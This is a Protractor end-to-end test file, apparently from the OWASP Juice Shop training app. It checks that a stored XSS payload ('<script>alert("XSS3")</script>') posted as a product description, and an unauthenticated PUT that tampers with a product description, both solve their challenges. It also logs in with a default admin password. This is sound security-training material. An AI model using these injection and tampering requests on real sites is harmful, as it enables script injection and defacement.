const config = require('config')
const tamperingProductId = ((() => {
  const products = config.get('products')
  for (let i = 0; i < products.length; i++) {
    if (products[i].useForProductTamperingChallenge) {
      return i + 1
    }
  }
})())

describe('/rest', () => {
  describe('challenge "xss3"', () => {
    protractor.beforeEach.login({email: 'admin@' + config.get('application.domain'), password: 'admin123'})

    it('should be possible to create a new product when logged in', () => {
      const EC = protractor.ExpectedConditions

      browser.executeScript('var $http = angular.injector([\'juiceShop\']).get(\'$http\'); $http.post(\'/api/Products\', {name: \'XSS3\', description: \'<script>alert("XSS3")</script>\', price: 47.11});')

      browser.get('/#/search')
      browser.wait(EC.alertIsPresent(), 5000, "'XSS3' alert is not present")
      browser.switchTo().alert().then(
                alert => {
                  expect(alert.getText()).toEqual('XSS3')
                  alert.accept()

                  browser.ignoreSynchronization = true
                  browser.executeScript('var $http = angular.injector([\'juiceShop\']).get(\'$http\'); $http.put(\'/api/Products/' + (config.get('products').length + 1) + '\', {description: \'alert disabled\'});')
                  browser.driver.sleep(1000)
                  browser.ignoreSynchronization = false
                })
    })

    protractor.expect.challengeSolved({challenge: 'XSS Tier 3'})
  })

  describe('challenge "changeProduct"', () => {
    it('should be possible to change product via PUT request without being logged in', () => {
      browser.ignoreSynchronization = true
      browser.executeScript('var $http = angular.injector([\'juiceShop\']).get(\'$http\'); $http.put(\'/api/Products/' + tamperingProductId + '\', {description: \'<a href="http://kimminich.de" target="_blank">More...</a>\'});')
      browser.driver.sleep(1000)
      browser.ignoreSynchronization = false
      browser.get('/#/search')
    })

    protractor.expect.challengeSolved({challenge: 'Product Tampering'})
  })
})
